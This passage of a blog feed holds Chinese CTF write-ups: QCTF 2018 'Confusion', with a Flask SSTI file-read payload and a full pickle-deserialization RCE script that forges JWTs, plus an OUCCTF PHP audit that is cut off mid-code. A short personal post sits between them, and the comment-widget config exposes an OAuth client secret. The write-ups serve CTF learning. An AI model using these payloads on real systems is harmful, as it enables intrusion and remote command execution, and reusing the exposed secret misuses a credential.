    <content type="html"><![CDATA[<h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><p>一进来浏览网站发现什么也没有，两个页面login.php和register.php全是404</p><blockquote><p>虽然题目描述里专门讲了不要使用扫描器，但是很多师傅还是非要用扫描器疯狂扫，比赛才刚开始1个小时日志就疯涨到了200M，后面不得已鄙人才着急写了个封IP的脚本，但是可能规则有点严，误封了不少人的IP，这都是后话了</p></blockquote><p>既然网站什么也没有，但是题目还是要做的，继续浏览网站，细心点的师傅可以发现在404页面里给了flag的路径<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715082911.png" alt></p><p>那么这个题的目的肯定就是要想办法读到flag文件，要读文件那就肯定要有用户输入，但是整个网站并没有可以和用户交互的地方，除了404页面url部分</p><p>有经验的师傅肯定做过其他比赛中有404页面url部分SSTI的题，这个题也是一样的，没有经验的萌新就只能一步步的试了，总之这个网站可以控制输出的地方只有404的url</p><p>测试<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/RZD@7C54NA5SQL42X.png" alt></p><p>所以这里存在SSTI，之后照着思路往下走，不细心的师傅可能走PHP的SSTI了，因为整个站鄙人都伪装成了Apache+PHP，其实整个站使用Python flask实现的，伪装的并不完美，如果师傅做题的时候不小心弄出个500，可能就会暴露真实的服务</p><p>现在仔细看首页的那张图应该就能明白那张图片的意思了2333333333<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/PythonVsPhp.png" alt></p><p>另外题目里对一些关键字做了过滤<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715084603.png" alt></p><p>用request.args绕过即可<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure><p>另外题目里除了flag，还给了一个salt，也拿上，下一个题会用到</p><hr><h1 id="Confusion2"><a href="#Confusion2" class="headerlink" title="Confusion2"></a>Confusion2</h1><p>这个题和Confusion1相比多了login和register，所以肯定要用到注册和登录<br>另外题目描述里讲了</p><blockquote><p> I find something STRANGE when Alice said hello to me.</p></blockquote><p>登录成功之后首页刚好会出现一个”hello”+用户名<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715085755.png" alt></p><p>所以就需要关注这个hello是怎么来的</p><p>从注册到登录，抓个包发现cookie比较奇怪，除了PHPSESSID（当然这是假的23333）还有一个token，经过分析发现这是一个JWT<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715090215.png" alt></p><p>这并不是标准的JWT,是鄙人自己实现的一个（为了师傅们做题方便用的算法是sha256），然后分析一下payload里是什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &quot;O:4:\&quot;User\&quot;:2:&#123;s:9:\&quot;user_data\&quot;;s:59:\&quot;(lp1\nVsrpopty\np2\naS&#39;0af1ebb83911a420f08e94e6028b93ad&#39;\np3\na.\&quot;;&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显data是一个PHP的序列化字符串，这时候很多师傅可能就会开始怀疑了，这个网站到底是个PHP还是个Python？接着分析下这个序列化字符串</p><p>User对象中有一个user_data的成员，值为</p><blockquote><p>(lp1\nVsrpopty\np2\naS’0af1ebb83911a420f08e94e6028b93ad’\np3\na.</p></blockquote><p>有经验的师傅这时候就可以看出来这是一个Python序列化的字符串，而且这个字符串中出现了两个很突出的部分：登录的用户名和一串hash，而这串hash就是用户名的md5<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091118.png" alt></p><p>把这个字符串手动在python里反序列化一下会发现这是一个列表，第一个元素是用户名，第二个元素是用户名的md5<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091600.png" alt></p><p>所以接下来就是利用python中class的__reduce__方法反序列化RCE，但是首先要想办法绕过JWT的验证</p><p>前面已经知道JWT中的算法是sha256，但是题目描述中说</p><blockquote><p>PS: Alice said she likes add salts when she was cooking.</p></blockquote><p>Hint中也提到</p><blockquote><p>hint：Alice likes adding salt at the LAST.</p></blockquote><p>在加上Confusion1中拿到的salt到现在都没有用到，所以sha256中需要加上前一道题中拿到的salt，根据Hint里提到的，salt需要加在最后，这样就能绕过JWT的验证了</p><p>需要注意一下的是在使用salt的时候格式是<br><code>jwt_header + &#39;.&#39; + jwt_payload + salt</code></p><p>可能很多人在payload和salt之间也多加了个点导致JWT一直过不去<br>鄙人的锅，很抱歉鄙人没有讲清楚导致很多师傅卡在这里了</p><p>另外需要注意就是python反序列化的payload放在PHP的序列化字符串中也要注意PHP序列化的格式，字符数量必须和前面的数字相等</p><p>最后在opt中找到flag<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715092347.png" alt></p><p>附exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Cookie</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> MD5proof</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'This script must be run on Linux!'</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">url = <span class="string">'http://xxxx:xxxx/'</span></span><br><span class="line">md5proof = MD5proof.Md5Proof(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">SALT = <span class="string">'_Y0uW1llN3verKn0w1t_'</span></span><br><span class="line">username = <span class="string">'srpopty'</span></span><br><span class="line">password = <span class="string">'srpopty'</span></span><br><span class="line">cmd = <span class="string">'ls'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_encode</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(text).replace(<span class="string">'+'</span>, <span class="string">'-'</span>).replace(<span class="string">'/'</span>, <span class="string">'_'</span>).replace(<span class="string">'='</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_decode</span><span class="params">(text)</span>:</span></span><br><span class="line">    text = text.replace(<span class="string">'-'</span>, <span class="string">'+'</span>).replace(<span class="string">'_'</span>, <span class="string">'/'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = base64.b64decode(text)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            text += <span class="string">'='</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> commands.getoutput, (cmd, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        verify = md5proof.Proof(re.findall(<span class="string">'\'\),0,6\) === \'(.*?)\'&lt;/span&gt;'</span>,</span><br><span class="line">                                           sess.get(url + <span class="string">'login.php'</span>, allow_redirects=<span class="literal">False</span>).content)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> len(verify) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">'*'</span> <span class="keyword">not</span> <span class="keyword">in</span> verify:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'verify'</span>: verify</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sess.post(url + <span class="string">'register.php'</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] Register failed!'</span></span><br><span class="line">        <span class="keyword">print</span> ret.content</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        verify = md5proof.Proof(re.findall(<span class="string">'\'\),0,6\) === \'(.*?)\'&lt;/span&gt;'</span>,</span><br><span class="line">                                           sess.get(url + <span class="string">'login.php'</span>, allow_redirects=<span class="literal">False</span>).content)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> len(verify) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">'*'</span> <span class="keyword">not</span> <span class="keyword">in</span> verify:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'verify'</span>: verify</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sess.post(url + <span class="string">'login.php'</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] Login failed!'</span></span><br><span class="line">        <span class="keyword">print</span> ret.content</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_jwt</span><span class="params">(kid, data)</span>:</span></span><br><span class="line">    jwt_header = base64_url_encode(</span><br><span class="line">        <span class="string">'&#123;"typ":"JWT","alg":"sha256","kid":"%d"&#125;'</span> % kid)</span><br><span class="line">    jwt_payload = base64_url_encode(<span class="string">'&#123;"data":"%s"&#125;'</span> % data)</span><br><span class="line">    jwt_signature = base64_url_encode(hashlib.sha256(</span><br><span class="line">        jwt_header + <span class="string">'.'</span> + jwt_payload + SALT).hexdigest())</span><br><span class="line">    <span class="keyword">return</span> jwt_header + <span class="string">'.'</span> + jwt_payload + <span class="string">'.'</span> + jwt_signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">()</span>:</span></span><br><span class="line">    payload = cPickle.dumps([PickleRce(), PickleRce()])</span><br><span class="line">    data = json.dumps(<span class="string">'O:4:"User":2:&#123;s:9:"user_data";s:%d:"%s";&#125;'</span> % (</span><br><span class="line">        len(payload), payload))[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> register(username, password) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    login_result = login(username, password)</span><br><span class="line">    <span class="keyword">if</span> login_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                cmd = raw_input(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">                cookies = login_result.cookies</span><br><span class="line">                <span class="comment"># print '[*] Old Cookie token: ' + cookies['token']</span></span><br><span class="line">                jwt = create_jwt(int(re.findall(<span class="string">'"kid":"(.*?)"'</span>, base64_url_decode(</span><br><span class="line">                    login_result.cookies[<span class="string">'token'</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]))[<span class="number">0</span>]), serialize())</span><br><span class="line">                new_token = Cookie.SimpleCookie().value_encode(jwt)[<span class="number">1</span>]</span><br><span class="line">                <span class="comment"># print '[*] New Cookie token: ' + new_token</span></span><br><span class="line">                new_cookies = &#123;</span><br><span class="line">                    <span class="string">'PHPSESSID'</span>: cookies[<span class="string">'PHPSESSID'</span>],</span><br><span class="line">                    <span class="string">'token'</span>: new_token</span><br><span class="line">                &#125;</span><br><span class="line">                ret = requests.get(url + <span class="string">'index.php'</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>, cookies=new_cookies)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[*] RCE result: '</span> + re.findall(<span class="string">'&lt;p class="hello"&gt;Hello ([\s\S]*?)&lt;/p&gt;'</span>, ret.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'\nExit.'</span></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这次比赛的确很难受，题目里说了别用扫描器，还是有很多人疯狂扫，最后把容器都扫崩了。赶出来一个封IP的脚本，虽然限制了扫描器，但是规则可能有点严（感觉也可能是玄学因素。。。），一开始3秒钟30个包封IP（这个的确鄙人也感觉太严格了），不少人被误封，后来改成3秒钟50个包，有些人说被误封了，最后3秒钟80个包还有说误封的。。。。到最后只能改成1秒80个包还是说有被误封的- -！日志量太大也实在不好审日志，所以最后只能把所有IP都解封，解封没多久又有上扫描器的。。。。</p><p>另外在日志中也能看到有些搅屎棍，的确，不得不说国内CTF比赛的环境实在是太恶劣了，自己做完了的题不想让别人做，还是多去打打国外的比赛吧。</p><p>最后的确鄙人也是太垃圾了，很抱歉没有给各位师傅创造一个良好的解题环境，以后鄙人一定更加努力！</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      QCTF 2018 confusuion writeup.
    
    </summary>
    
    
      <category term="ctf" scheme="https://srpopty.github.io/categories/ctf/"/>
    
    
      <category term="writeup" scheme="https://srpopty.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>The creed, The belief, The symbol</title>
    <link href="https://srpopty.github.io/2018/06/18/The-creed-The-belief-The-symbol/"/>
    <id>https://srpopty.github.io/2018/06/18/The-creed-The-belief-The-symbol/</id>
    <published>2018-06-18T14:30:32.000Z</published>
    <updated>2020-03-11T13:26:11.415Z</updated>
    
    <content type="html"><![CDATA[<p>Friends are supposed to be honest with each other, and you weren’t.</p><p>Control is an illusion.</p><p>The fake, hypocritical and pointless s0ciety.</p><p>The human codition is a straight-up tragedy.</p><hr><ul><li>Do not trust anyone.</li><li>Never let them know what I’m thinking.</li><li>Keep silence forever.</li></ul><p>Annihilation is always the answer. We destroy parts of ourselves erery day, we Photoshop our warts away, we edit the parts we hate about ourselves, the parts we thik people hate, we curate our identity, carve it, distill it. Annihilation is all we are.</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      Nothing...
    
    </summary>
    
    
      <category term="life" scheme="https://srpopty.github.io/categories/life/"/>
    
    
      <category term="think" scheme="https://srpopty.github.io/tags/think/"/>
    
  </entry>
  
  <entry>
    <title>OUCCTF2018 Partial Writeup</title>
    <link href="https://srpopty.github.io/2018/06/11/OUCCTF2018-Partial-Writeup/"/>
    <id>https://srpopty.github.io/2018/06/11/OUCCTF2018-Partial-Writeup/</id>
    <published>2018-06-11T15:24:14.000Z</published>
    <updated>2020-03-11T13:44:32.324Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文中的write up仅包含鄙人负责的题目</p></blockquote><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web-Sign-In"><a href="#Web-Sign-In" class="headerlink" title="Web Sign In"></a>Web Sign In</h2><blockquote><p>Find the first flag at this website :)<br>  Hint: Ctrl + U will take you enter into a new world!</p></blockquote><p>Ctrl + U查看网站源码就能在最底下找到flag</p><blockquote><p>flag{We1C0m3_7he_game!}</p></blockquote><hr><h2 id="Magic-Number"><a href="#Magic-Number" class="headerlink" title="Magic Number"></a>Magic Number</h2><blockquote><p>Give me the magic number and you can get flag.</p></blockquote><p>打开网页什么也没有，抓包在响应头中获得Hint</p><blockquote><p>hint: ?source</p></blockquote><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do you know what it is doing?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($n)</span> </span>&#123;</span><br><span class="line">    $n = strval($n);</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = strlen($n) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</span><br><span class="line">        <span class="keyword">if</span>($n[$i] !== $n[$j])</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$msg = <span class="string">""</span>;</span><br><span class="line">$request = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; is_numeric($value) &amp;&amp; $request[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($request[<span class="string">"number"</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($request[<span class="string">"number"</span>] != intval($request[<span class="string">"number"</span>])) &#123;</span><br><span class="line">        $msg = <span class="string">"Number must be integer!"</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($request[<span class="string">"number"</span>][<span class="number">0</span>] === <span class="string">"+"</span> || $request[<span class="string">"number"</span>][<span class="number">0</span>] === <span class="string">"-"</span>) &#123;</span><br><span class="line">        $msg = <span class="string">"No symbol!"</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (intval($request[<span class="string">"number"</span>]) != intval(strrev($request[<span class="string">"number"</span>]))) &#123;</span><br><span class="line">        $msg = <span class="string">"Do you know what is the palindrome number?"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(check($request[<span class="string">"number"</span>])) &#123;</span><br><span class="line">            $msg = <span class="string">"You did not pass the check! Sorry I can not give you the flag."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          $msg = <span class="string">"Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"hint: ?source"</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Enjoy yourself!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $msg;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码，首先对所有的get和post参数做了如下处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; is_numeric($value) &amp;&amp; $request[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的参数必须是字符串，且该字符串必须是数字，并且对字符串进行了转义处理<br>再向下看可以看到想拿到flag需要以下四个条件成立</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$request[<span class="string">"number"</span>] == intval($request[<span class="string">"number"</span>]) <span class="comment">// number必须是数字</span></span><br><span class="line">$request[<span class="string">"number"</span>][<span class="number">0</span>] !== <span class="string">"+"</span> &amp;&amp; $request[<span class="string">"number"</span>][<span class="number">0</span>] !== <span class="string">"-"</span> <span class="comment">// 不能有正负号</span></span><br><span class="line">intval($request[<span class="string">"number"</span>]) == intval(strrev($request[<span class="string">"number"</span>])) <span class="comment">// number字符串反转后的intval必须和原来的intval相等</span></span><br><span class="line">check($request[<span class="string">"number"</span>]) === <span class="keyword">false</span></span><br></pre></td></tr></table></figure><p>前三个条件使得传入的number必须是一个回文数，类似123321这种的<br>看看check函数做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Do you know what it is doing?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($n)</span> </span>&#123;</span><br><span class="line">    $n = strval($n); <span class="comment">// n转成字符串</span></span><br><span class="line">    $i = <span class="number">0</span>; <span class="comment">// 计数器i从字符串起始位置开始</span></span><br><span class="line">    $j = strlen($n) - <span class="number">1</span>; <span class="comment">// 计数器j从字符串最后一位开始</span></span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</span><br><span class="line">        <span class="keyword">if</span>($n[$i] !== $n[$j])</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        $i++; <span class="comment">// 从前往后移动</span></span><br><span class="line">        $j--; <span class="comment">// 从后往前移动</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span 